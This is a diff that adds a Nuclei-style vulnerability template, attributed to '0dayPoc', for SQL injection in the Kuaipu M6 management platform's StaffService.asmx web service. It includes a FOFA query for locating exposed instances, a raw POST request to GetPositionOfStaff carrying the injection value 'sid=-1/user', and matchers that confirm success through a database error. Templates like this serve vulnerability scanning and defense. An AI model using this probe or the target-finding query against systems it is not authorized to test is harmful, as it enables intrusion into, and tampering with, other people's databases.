@@ -1,0 +1,27 @@
+id: kuaipu-m6-staffservice-sqli
+
+info:
+  name: 快普M6 WebService/StaffService.asmx 多方法SQL注入漏洞
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
+      快普M6整合管理平台的WebService/StaffService.asmx接口存在多处方法未正确验证用户输入，导致可被利用执行SQL注入攻击。攻击者通过构造恶意输入绕过输入验证机制，可能实现数据库查询权限提升、数据篡改或系统控制权获取等未授权操作。
+  tags: 快普M6
+
+http:
+- raw:
+  - |
+    POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    sid=-1/user
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [500]
+  - type: word
+    part: body
+    words:
+    - 'dbo'
